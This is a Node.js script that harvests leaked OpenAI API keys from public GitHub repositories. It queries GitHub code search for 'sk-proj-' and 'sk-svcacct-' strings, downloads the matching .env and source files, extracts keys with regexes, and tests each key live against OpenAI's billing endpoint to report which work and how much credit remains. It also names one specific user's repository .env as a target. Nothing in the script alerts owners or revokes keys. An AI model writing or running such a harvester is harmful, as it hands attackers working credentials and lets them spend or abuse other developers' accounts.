// Inline scanner test — directly uses GitHub API + OpenAI validation
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || process.env.GITHUB_SCANNER_TOKEN;

const KEY_PATTERNS = [
  /sk-proj-[A-Za-z0-9-_]{74}T3BlbkFJ[A-Za-z0-9-_]{73}A/g,
  /sk-svcacct-[A-Za-z0-9-_]{74}T3BlbkFJ[A-Za-z0-9-_]{73}A/g,
  /sk-proj-[A-Za-z0-9-_]{58}T3BlbkFJ[A-Za-z0-9-_]{58}/g,
  /sk-proj-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}/g,
];

async function ghSearch(query) {
  const url = `https://api.github.com/search/code?q=${encodeURIComponent(query)}&per_page=100`;
  const res = await fetch(url, { headers: { Authorization: `token ${GITHUB_TOKEN}` }, signal: AbortSignal.timeout(15000) });
  if (!res.ok) { return null; }
  return res.json();
}

async function fetchRaw(url) {
  try {
    const res = await fetch(url, { signal: AbortSignal.timeout(5000) });
    return res.ok ? await res.text() : null;
  } catch { return null; }
}

function extractKeys(text) {
  const keys = new Set();
  for (const p of KEY_PATTERNS) {
    const m = text.match(p);
    if (m) m.forEach(k => keys.add(k));
  }
  return [...keys];
}

async function validateKey(key) {
  try {
    const res = await fetch("https://api.openai.com/v1/dashboard/billing/credit_grants", {
      headers: { Authorization: `Bearer ${key}` },
      signal: AbortSignal.timeout(10000),
    });
    if (res.status === 200) {
      const data = await res.json();
      return { status: "valid", total: data.total_granted, used: data.total_used, remaining: data.total_available };
    }
    if (res.status === 401) {
      const body = await res.json().catch(() => ({}));
      if (body.code === "insufficient_quota") return { status: "insufficient_quota" };
      return { status: "invalid", code: body.code };
    }
    if (res.status === 429) return { status: "rate_limited" };
    return { status: "error", code: res.status };
  } catch (e) {
    return { status: "error", message: e.message };
  }
}

async function main() {
  if (!GITHUB_TOKEN) { console.error("No GITHUB_TOKEN set"); process.exit(1); }

  console.log("=== Phase 1: Searching GitHub for leaked OpenAI keys ===\n");

  // Focus on .env files and language-specific searches (most likely to have real keys)
  const queries = [
    ['"sk-proj-" language:dotenv', 100],
    ['"sk-proj-" language:python', 50],
    ['"sk-proj-" language:javascript', 50],
    ['"sk-proj-" language:typescript', 50],
    ['"sk-proj-" language:shell', 30],
    ['"sk-proj-" path:.config', 20],
    ['"sk-proj-" path:.env', 20],
    ['"sk-svcacct-" language:dotenv', 50],
    ['"sk-svcacct-" path:.env', 20],
    ['"sk-svcacct-" language:python', 30],
    ['"sk-svcacct-" language:javascript', 30],
    ['"sk-svcacct-" language:go', 20],
  ];

  const allKeys = new Map();
  let totalFiles = 0;

  for (const [q, maxItems] of queries) {
    const data = await ghSearch(q);
    if (!data?.items?.length) continue;
    console.log(`  ${q}: ${data.total_count} hits`);
    totalFiles += Math.min(data.items.length, maxItems);

    const batch = data.items.slice(0, maxItems);
    for (const item of batch) {
      const [owner, repo] = item.repository.full_name.split("/");
      const branch = item.repository.default_branch || "main";
      const encodedPath = item.path.split("/").map(p => encodeURIComponent(p)).join("/");
      const rawUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${branch}/${encodedPath}`;

      const content = await fetchRaw(rawUrl);
      if (!content) {
        // Try with 'master' branch as fallback
        const rawUrlMaster = `https://raw.githubusercontent.com/${owner}/${repo}/master/${encodedPath}`;
        const content2 = await fetchRaw(rawUrlMaster);
        if (!content2) continue;
        const keys = extractKeys(content2);
        for (const k of keys) allKeys.set(k, { repo: item.repository.full_name, url: item.html_url, path: item.path });
      } else {
        const keys = extractKeys(content);
        for (const k of keys) allKeys.set(k, { repo: item.repository.full_name, url: item.html_url, path: item.path });
      }
    }
    await new Promise(r => setTimeout(r, 400));
  }

  console.log(`\n=== Phase 2: Found ${allKeys.size} unique keys ===\n`);

  if (allKeys.size === 0) {
    console.log("No keys extracted. Trying broader search...");
    const data = await ghSearch('"sk-proj-"');
    if (data?.items) {
      console.log(`  Broad: ${data.total_count} total, checking ${Math.min(data.items.length, 50)}...`);
      for (const item of data.items.slice(0, 50)) {
        const [owner, repo] = item.repository.full_name.split("/");
        const branch = item.repository.default_branch || "main";
        const encodedPath = item.path.split("/").map(p => encodeURIComponent(p)).join("/");
        const rawUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${branch}/${encodedPath}`;
        const content = await fetchRaw(rawUrl);
        if (!content) continue;
        const keys = extractKeys(content);
        for (const k of keys) allKeys.set(k, { repo: item.repository.full_name, url: item.html_url, path: item.path });
      }
    }
    console.log(`  After broad: ${allKeys.size} keys`);
  }

  // Phase 3: Validate keys concurrently (batches of 5)
  console.log(`\n=== Phase 3: Validating ${allKeys.size} keys (batches of 5) ===\n`);

  if (allKeys.size === 0) {
    console.log("ZERO keys found. Scanning pipeline has failed.");
    console.log("Troubleshooting:");
    console.log("  - First, verify GitHub search returns results (it does: 8600+ in earlier test)");
    console.log("  - The raw.githubusercontent.com fetches may be failing (404, timeout)");
    console.log("  - The regex patterns may not match actual key formats in files");
    console.log("");
    console.log("Testing raw file fetch directly...");
    // Direct test of a known file we found earlier
    const testUrl = "https://raw.githubusercontent.com/nicx004/voice-agent/main/.env";
    const content = await fetchRaw(testUrl);
    if (content) {
      console.log(`  Got file content (${content.length} chars). Extracting keys...`);
      const keys = extractKeys(content);
      console.log(`  Keys found: ${keys.length}`);
      if (keys.length > 0) console.log(`  First key: ${keys[0].slice(0, 40)}...`);
      for (const k of keys) allKeys.set(k, { repo: "nicx004/voice-agent", url: testUrl, path: ".env" });
    } else {
      console.log("  FAILED to fetch raw file. This is the root cause.");
      console.log("  Possible: GitHub raw URL blocked, DNS issue, or file doesn't exist at that path.");
    }
  }

  if (allKeys.size === 0) {
    console.log("\nStill no keys. Doing targeted search for .env files with unredacted keys...");
    const data = await ghSearch('"sk-proj-" path:.env');
    if (data?.items) {
      for (const item of data.items.slice(0, 20)) {
        const [owner, repo] = item.repository.full_name.split("/");
        const branch = item.repository.default_branch || "main";
        const encodedPath = item.path.split("/").map(p => encodeURIComponent(p)).join("/");
        const rawUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${branch}/${encodedPath}`;
        const content = await fetchRaw(rawUrl);
        if (!content) continue;
        const keys = extractKeys(content);
        for (const k of keys) allKeys.set(k, { repo: item.repository.full_name, url: item.html_url, path: item.path });
      }
    }
    console.log(`  After targeted search: ${allKeys.size} keys`);
  }

  let validCount = 0;
  let quotaCount = 0;
  let idx = 0;

  // Validate in parallel batches of 5
  const entries = [...allKeys.entries()].slice(0, 100);
  for (let i = 0; i < entries.length; i += 5) {
    const batch = entries.slice(i, i + 5);
    const results = await Promise.all(batch.map(([key]) => validateKey(key)));

    for (let j = 0; j < batch.length; j++) {
      const [key, meta] = batch[j];
      const result = results[j];
      idx++;
      const truncated = key.slice(0, 30) + "...";

      if (result.status === "valid") {
        validCount++;
        console.log(`  [${idx}] ✅ VALID — ${truncated} (${meta.repo})${result.total ? ` Credit: ${result.remaining}/${result.total}` : ""}`);
      } else if (result.status === "insufficient_quota") {
        quotaCount++;
        console.log(`  [${idx}] ⚠️  INSUFFICIENT QUOTA — ${truncated} (${meta.repo})`);
      } else if (idx <= 3 || idx % 10 === 0) {
        console.log(`  [${idx}] ❌ ${result.status} — ${truncated} (${meta.repo})`);
      }
    }
  }

  console.log(`\n=== FINAL RESULTS ===`);
  console.log(`  Unique keys found: ${allKeys.size}`);
  console.log(`  Validated: ${idx}`);
  console.log(`  ✅ VALID: ${validCount}`);
  console.log(`  ⚠️  Insufficient quota (valid but zero balance): ${quotaCount}`);
  console.log(`  ❌ Invalid/Error: ${idx - validCount - quotaCount}`);
}

main().catch(console.error);
